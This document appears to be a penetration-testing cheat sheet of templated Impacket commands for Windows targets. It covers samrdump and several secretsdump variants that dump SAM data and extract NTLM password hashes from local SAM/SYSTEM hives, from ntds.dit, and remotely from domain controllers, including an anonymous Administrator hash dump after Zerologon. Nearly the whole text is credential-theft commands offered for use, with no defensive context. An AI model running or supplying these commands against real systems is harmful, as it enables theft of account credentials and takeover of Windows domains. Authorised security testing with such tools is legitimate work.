# Impacket

% impacket, windows, smb, 445

## samrdump - system account, shares, etc... (dump info from the Security Account Manager (SAM))
#platform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
samrdump.py <domain>/<user>:<password>@<target_ip>
```

## secretsdump
#platform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump '<domain>/<user>:<password>'@<target_ip>
```

## secretsdump local dump - extract hash from sam database
#platform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump  -system <SYSTEM_FILE|SYSTEM> -sam <SAM_FILE|SAM> LOCAL
```

## secretsdump local dump - extract hash from ntds.dit
#platform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump  -ntds <ntds_file.dit> -system <SYSTEM_FILE> -hashes <lmhash|00000000000000000000000000000000>:<nthash> LOCAL -outputfile <ntlm-extract-file>
```

## secretsdump - anonymous get administrator 
zerologon
#platform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump <domain>/<dc_bios_name>\$/@<target_ip> -no-pass -just-dc-user "Administrator"
```

## secretsdump - remote extract
#platform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump -just-dc-ntlm -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<target_ip>
```

## secretsdump - remote extract + users infos
#platform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<target_ip>
```


